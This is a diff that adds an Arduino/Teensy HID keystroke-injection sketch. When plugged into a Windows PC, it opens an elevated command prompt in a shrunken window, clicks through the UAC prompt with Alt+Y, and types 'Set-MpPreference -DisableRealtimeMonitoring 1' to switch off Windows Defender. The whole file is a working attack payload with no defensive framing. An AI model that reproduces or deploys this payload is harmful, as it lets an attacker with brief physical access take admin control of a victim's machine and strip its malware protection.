@@ -1,0 +1,97 @@
+
+const unsigned int ledPin = 13;
+
+
+void setup()
+{
+
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);
+  delay(500);
+  digitalWrite(ledPin, LOW);
+  NoUAC();
+}
+
+void loop()
+{
+}
+
+void returnCode(unsigned int numBlinks, unsigned int halfDelay)
+{
+  unsigned int count = 0;
+
+  for (count = 0; count != numBlinks; count++)
+  {
+
+    digitalWrite(ledPin, HIGH);
+    delay(halfDelay);
+    digitalWrite(ledPin, LOW);
+    delay(halfDelay);
+
+  }
+}
+
+void clearKeys()
+{
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(100);
+}
+void NoUAC()
+{
+  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+  Keyboard.send_now();
+  clearKeys();
+
+  delay(1000);
+
+  returnCode(1, 100);
+
+  Keyboard.print("cmd.exe /K mode CON: COLS=14 LINES=1");
+
+
+  delay(1000);
+
+
+  returnCode(1, 100);
+
+
+  Keyboard.set_modifier(MODIFIERKEY_CTRL);
+  Keyboard.send_now();
+  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
+  Keyboard.send_now();
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  delay(100);
+  clearKeys();
+
+  delay(1000);
+
+
+  returnCode(1, 100);
+
+  YUAC();
+  delay(1000);
+  returnCode(1, 100);
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  delay(100);
+  clearKeys();    
+  Keyboard.print("PowerShell Set-MpPreference -DisableRealtimeMonitoring 1");
+  delay(3000); 
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  delay(100);
+  clearKeys();
+
+}
+
+void YUAC()
+{
+  Keyboard.set_modifier(MODIFIERKEY_ALT);
+  Keyboard.set_key1(KEY_Y);
+  Keyboard.send_now();
+  delay(100);
+  clearKeys();
+}
